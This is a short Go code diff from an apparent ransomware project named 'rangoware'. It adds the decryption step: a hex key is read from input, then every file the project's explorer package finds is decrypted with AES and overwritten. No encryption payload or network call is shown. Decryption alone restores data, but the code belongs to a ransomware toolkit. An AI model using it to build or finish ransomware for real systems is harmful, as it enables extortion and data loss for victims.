@@ -4,9 +4,13 @@ import (
 	"bufio"
 	"crypto/aes"
 	"crypto/cipher"
+	"encoding/hex"
 	"fmt"
+	"io/ioutil"
 	"os"
 	"strings"
+
+	"github.com/LuanSilveiraSouza/rangoware/explorer"
 )
 
 func main() {
@@ -18,7 +22,32 @@ func main() {
 
 	text = strings.Replace(text, "\n", "", -1)
 
-	fmt.Println(text)
+	key, err := hex.DecodeString(text)
+
+	if err != nil {
+		fmt.Println("Wrong key.")
+	} else {
+
+		files := explorer.MapFiles()
+
+		for _, v := range files {
+			file, err := ioutil.ReadFile(v)
+
+			if err != nil {
+				continue
+			}
+
+			decrypted, err := Decrypt(file, key)
+
+			if err != nil {
+				continue
+			}
+
+			ioutil.WriteFile(v, decrypted, 0644)
+		}
+
+		fmt.Println("Files Decrypted.")
+	}
 
 	os.Exit(3)
 }
